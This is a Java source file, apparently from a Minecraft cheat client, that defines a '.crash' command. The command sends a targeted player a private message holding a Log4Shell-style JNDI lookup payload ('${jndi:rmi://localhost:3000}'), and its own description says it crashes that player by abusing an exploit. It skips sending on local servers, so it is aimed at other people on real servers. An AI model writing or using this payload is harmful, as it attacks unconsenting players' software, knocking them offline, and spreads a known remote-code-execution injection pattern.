package dev.rise.command.impl;

import dev.rise.Rise;
import dev.rise.command.Command;
import dev.rise.command.api.CommandInfo;
import dev.rise.util.player.PlayerUtil;

@CommandInfo(name = "Crash", description = "Crashes the specified player by abusing an exploit", syntax = ".crash <player>", aliases = "crash")
public final class Crash extends Command {

    @Override
    public void onCommand(final String command, final String[] args) throws Exception {
        if (!(PlayerUtil.isOnServer("127.0.0.1") || PlayerUtil.isOnServer("localhost")))
            mc.thePlayer.sendChatMessage("/msg " + args[0] + " ${jndi:rmi://localhost:3000}");

        Rise.INSTANCE.getNotificationManager().registerNotification("Attempted to crash " + args[0] + ".");
    }
}
